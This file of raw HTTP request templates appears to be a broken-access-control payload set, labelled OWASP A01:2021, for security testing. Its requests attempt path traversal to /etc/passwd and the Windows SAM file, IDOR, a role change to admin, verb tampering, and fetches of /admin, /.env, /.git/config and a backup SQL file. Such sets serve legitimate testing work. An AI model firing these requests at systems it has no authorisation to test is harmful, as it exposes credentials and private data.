# OWASP Top 10 - A01:2021 Broken Access Control
# Tentatives d'accès non autorisé à des ressources

### Path Traversal - Linux
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0

### Path Traversal - Windows
GET /download?file=..\..\..\..\windows\system32\config\sam HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0

### IDOR - Accès direct à un objet
GET /api/users/1337/profile HTTP/1.1
Host: {{host}}
Authorization: Bearer user123_token

### Force Browsing - Admin panel
GET /admin/dashboard HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0

### Parameter Tampering - Élévation de privilèges
POST /api/users/update HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 45

{"user_id": 123, "role": "admin", "active": true}

### HTTP Verb Tampering
DELETE /api/users/1 HTTP/1.1
Host: {{host}}
User-Agent: Mozilla/5.0

### Forced Browsing - Backup files
GET /backup.sql HTTP/1.1
Host: {{host}}

### Forced Browsing - Config files
GET /.env HTTP/1.1
Host: {{host}}

### Forced Browsing - Git exposure
GET /.git/config HTTP/1.1
Host: {{host}}
